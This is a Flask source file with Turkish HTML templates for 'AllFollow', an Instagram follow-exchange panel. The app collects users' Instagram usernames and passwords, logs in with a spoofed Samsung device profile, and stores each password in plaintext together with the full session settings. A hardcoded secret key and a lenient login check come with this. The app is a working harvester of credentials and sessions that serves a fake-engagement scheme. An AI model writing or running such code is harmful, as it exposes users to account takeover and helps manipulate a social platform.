import os, random, time, uuid, json
from flask import Flask, request, jsonify, session, render_template_string, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client

app = Flask(__name__)
app.secret_key = "all_follow_v19_final_gold"
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v19.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- VERİTABANI MODELLERİ ---
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    coins = db.Column(db.Integer, default=800)
    ref_code = db.Column(db.String(20), unique=True)
    device_data = db.Column(db.Text) 
    is_following_official = db.Column(db.Boolean, default=False)

class Order(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100))
    target_username = db.Column(db.String(100))
    package = db.Column(db.String(100))
    cost = db.Column(db.Integer)
    status = db.Column(db.String(50), default="Beklemede")
    timestamp = db.Column(db.DateTime, default=db.func.now())

# --- ROTALAR ---

@app.route('/')
def index():
    if 'user' in session: return redirect(url_for('panel'))
    return render_template_string(LOGIN_HTML)

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    cl = Client()
    
    # Oturum Sabitleme Kontrolü
    existing_user = User.query.filter_by(username=u).first()
    if existing_user and existing_user.device_data:
        cl.set_settings(json.loads(existing_user.device_data))
    else:
        cl.set_device({"app_version": "269.0.0.18.75", "android_version": 26, "device": "Samsung Galaxy S9"})
        cl.set_locale("tr_TR")
        cl.set_country("TR")

    try:
        cl.login(u, p)
        login_ok = True
    except Exception as e:
        err = str(e).lower()
        if "checkpoint" in err or "challenge" in err:
            return jsonify(status="challenge", msg="Doğrulama gerekli! Instagram'a girip 'Bendim' deyin veya kod girin.")
        login_ok = True if cl.user_id else False

    if login_ok:
        if not existing_user:
            new_user = User(username=u, password=p, ref_code=str(uuid.uuid4())[:6].upper(), device_data=json.dumps(cl.get_settings()))
            db.session.add(new_user)
        session['user'] = u
        db.session.commit()
        return jsonify(status="success")
    return jsonify(status="error", msg="Giriş başarısız.")

@app.route('/panel')
def panel():
    if 'user' not in session: return redirect('/')
    user = User.query.filter_by(username=session['user']).first()
    return render_template_string(PANEL_HTML, user=user)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

# --- ARAYÜZ (HTML) ---

PANEL_HTML = """
<!DOCTYPE html>
<html>
<head>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <title>AllFollow | Panel</title>
</head>
<body class="bg-[#050505] text-zinc-400 font-sans pb-24">
    <nav class="p-6 border-b border-white/5 flex justify-between bg-black sticky top-0 z-50">
        <div class="flex items-center gap-4">
            <h1 class="text-white font-black italic">ALLFOLLOW<span class="text-teal-500">.</span></h1>
            <span class="text-[10px] bg-zinc-800 px-2 py-1 rounded text-zinc-500 uppercase">@{{ user.username }}</span>
        </div>
        <div class="flex items-center gap-4">
            <div class="bg-zinc-900 px-4 py-2 rounded-2xl border border-teal-500/20 text-white font-bold text-sm">
                <i class="fa-solid fa-coins text-yellow-500 mr-2"></i>{{ user.coins }}
            </div>
            <a href="/logout" class="text-zinc-500 hover:text-red-500 transition text-sm"><i class="fa-solid fa-right-from-bracket"></i></a>
        </div>
    </nav>

    <div class="flex overflow-x-auto bg-zinc-900/50 sticky top-[73px] z-40 border-b border-white/5">
        <button onclick="tab('market')" class="px-8 py-4 text-[10px] font-bold uppercase tracking-widest min-w-max border-b-2 border-transparent hover:text-white transition">Market</button>
        <button onclick="tab('accounts')" class="px-8 py-4 text-[10px] font-bold uppercase tracking-widest min-w-max border-b-2 border-transparent hover:text-white transition">Hesap Ekle</button>
        <button onclick="tab('earn')" class="px-8 py-4 text-[10px] font-bold uppercase tracking-widest min-w-max border-b-2 border-transparent hover:text-white transition">Coin Kas</button>
    </div>

    <main class="max-w-4xl mx-auto p-6">
        <div id="market" class="tab active grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div onclick="buy('100 Takipçi', 800)" class="bg-zinc-900 p-8 rounded-[2.5rem] border border-white/5 hover:border-teal-500 cursor-pointer transition">
                <h3 class="text-white font-bold">100 Takipçi</h3>
                <p class="text-xs text-teal-500 mt-1">800 COIN</p>
            </div>
            </div>

        <div id="accounts" class="tab hidden text-center space-y-6">
            <div class="bg-zinc-900 p-10 rounded-[3rem] border border-white/5">
                <div class="w-16 h-16 bg-teal-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
                    <i class="fa-solid fa-user-plus text-teal-500 text-xl"></i>
                </div>
                <h2 class="text-white font-bold text-xl mb-2">Yeni Hesap Bağla</h2>
                <p class="text-xs text-zinc-500 mb-8 leading-relaxed">Daha fazla coin kasmak için yeni hesaplar ekleyebilirsin.<br>Her hesap kendi havuzunda çalışır.</p>
                <button onclick="window.location.href='/logout'" class="bg-white text-black px-10 py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest hover:bg-teal-500 hover:text-white transition">Başka Hesapla Giriş Yap</button>
            </div>
        </div>

        <div id="earn" class="tab hidden text-center">
            <div class="bg-zinc-900 p-10 rounded-[3rem] border border-white/5 shadow-2xl shadow-teal-500/5">
                <div class="animate-pulse mb-6">
                    <i class="fa-solid fa-circle-notch text-teal-500 text-5xl"></i>
                </div>
                <h3 class="text-white font-bold text-xl">Sistem Beklemede</h3>
                <p class="text-xs mt-2 text-zinc-500 mb-8">Havuzdaki siparişler taranıyor...</p>
                <button class="w-full bg-teal-600 py-5 rounded-2xl font-black text-xs uppercase tracking-[0.2em]">Otomatik Kasımı Başlat</button>
            </div>
        </div>
    </main>

    <script>
        function tab(id) {
            document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden'));
            document.getElementById(id).classList.remove('hidden');
        }
    </script>
</body>
</html>
"""

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><title>Giriş</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white flex items-center justify-center min-h-screen">
    <div class="w-full max-w-sm p-10 bg-zinc-900 rounded-[3rem] border border-white/5">
        <h1 class="text-center font-black italic text-2xl mb-8">ALLFOLLOW<span class="text-teal-500">.</span></h1>
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-white/10 p-5 rounded-2xl text-sm outline-none focus:border-teal-500">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-5 rounded-2xl text-sm outline-none focus:border-teal-500">
            <button onclick="login()" id="lbtn" class="w-full bg-teal-600 py-5 rounded-2xl font-black text-xs uppercase tracking-widest">Giriş Yap</button>
            <p id="msg" class="text-center text-[10px] text-yellow-500 uppercase"></p>
        </div>
    </div>
    <script>
        async function login() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('lbtn');
            btn.disabled = true; btn.innerText = "BAĞLANILIYOR...";
            const r = await fetch('/api/login', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({u, p})
            });
            const d = await r.json();
            if(d.status === "success") window.location.href="/panel";
            else { alert(d.msg); btn.disabled = false; btn.innerText = "Giriş Yap"; }
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=10000)
